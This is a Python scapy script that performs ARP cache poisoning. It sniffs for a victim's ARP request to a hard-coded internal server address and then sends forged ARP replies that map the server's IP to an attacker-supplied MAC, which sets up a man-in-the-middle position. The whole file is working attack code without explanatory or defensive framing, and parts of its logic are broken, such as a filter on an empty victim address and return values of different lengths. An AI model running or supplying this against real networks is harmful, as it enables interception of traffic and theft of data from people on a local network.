import scapy.all as sc;
import time;
import ipaddress;

interface = sc.conf.iface

def get_mac(ip):
    arp = sc.ARP(pdst=ip)
    broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp
    answered = sc.srp(packet, timeout=2, verbose=False, iface=interface)[0]
    for _, received in answered:
        return received.hwsrc
    return None

#do the poisoning
def arp_poisoning(toSpoof, spoof_as_mac, mode, logger=None):
    def log(msg):
        if logger:
            logger(msg)
        else:
            print(msg)

    attacker_mac = spoof_as_mac
    victim_mac = None
    victim_ip = toSpoof

    try:
        # wait for any arp broadcast
        if not victim_ip:
            log("Waiting for any ARP broadcast to discover victim IPs")
            pkt = sc.sniff(
                iface=interface,
                filter="arp",
                store=1,
                lfilter=lambda p: p.haslayer(sc.ARP)
                                and p[sc.ARP].psrc == victim_ip
                                and p[sc.ARP].pdst == "10.116.73.70",
                stop_filter=lambda p: True
            )[0]
            victim_ip = pkt[sc.ARP].psrc
            server_ip = pkt[sc.ARP].pdst
            victim_mac = get_mac(victim_ip)

        #get mac addresses from given IP's
        else:
            log("Waiting for ARP broadcast from victim")
            victim_mac = get_mac(victim_ip)
            pkt = sc.sniff(
                iface=interface,
                filter="arp",
                store=1,
                lfilter=lambda p: p.haslayer(sc.ARP)
                                and p[sc.ARP].psrc == victim_ip
                                and p[sc.ARP].pdst == "10.116.73.70",
                stop_filter=lambda p: True
            )[0]
            log(f"found pkt {pkt}")
            server_ip = pkt[sc.ARP].pdst

        if not victim_mac:
            log("Could not resolve MAC addresses.")
            return None, None

        # create the fake responses
        fake_packet_victim = sc.Ether(dst=victim_mac) / sc.ARP(
            op=2, pdst=victim_ip, hwdst=victim_mac, psrc=server_ip, hwsrc=attacker_mac)

        #send the responses
        if mode == "silent":
            sc.sendp(fake_packet_victim, iface=interface, verbose=False)
        else:
            for i in range(5):
                sc.sendp(fake_packet_victim, iface=interface, verbose=False)
                time.sleep(0.5)
        return victim_mac, server_ip, victim_ip

    except Exception as e:
        log(f"Error during ARP poisoning: {e}")
        return None, None
    
